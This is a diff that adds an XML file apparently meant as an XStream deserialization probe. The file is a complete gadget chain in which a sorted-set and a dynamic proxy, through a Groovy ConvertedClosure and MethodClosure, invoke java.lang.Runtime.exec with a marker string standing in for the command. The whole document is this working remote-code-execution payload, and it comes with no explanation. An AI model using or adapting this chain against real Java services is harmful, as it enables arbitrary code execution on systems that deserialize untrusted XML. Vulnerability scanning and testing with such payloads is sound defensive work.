@@ -1,0 +1,13 @@
+<sorted-set>
+  <string><![CDATA[Remote_Code_Execution_vulnerability_is_present]]></string>
+  <dynamic-proxy>
+    <interface>java.lang.Comparable</interface>
+    <handler class="org.codehaus.groovy.runtime.ConvertedClosure">
+      <delegate class="org.codehaus.groovy.runtime.MethodClosure">
+        <owner class="java.lang.Runtime"></owner>
+        <method>exec</method>
+      </delegate>
+      <methodName>compareTo</methodName>
+    </handler>
+  </dynamic-proxy>
+</sorted-set>
